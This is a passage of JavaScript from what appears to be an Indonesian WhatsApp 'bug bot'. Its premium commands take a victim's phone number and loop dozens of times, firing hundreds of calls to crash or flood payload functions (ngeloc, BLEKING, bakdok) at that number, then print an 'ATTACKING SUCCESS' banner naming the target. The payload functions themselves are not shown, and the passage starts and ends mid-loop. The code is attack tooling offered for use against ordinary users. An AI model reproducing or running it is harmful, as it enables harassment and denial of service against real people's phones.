await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'sok-asik': case 'hah': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'galaxycrash': case 'wet': case 'inikan': case 'knapa': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'pann-offc': case 'pannoffcaja': case 'bjir': case 'crott': case 'kenal-pann?': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
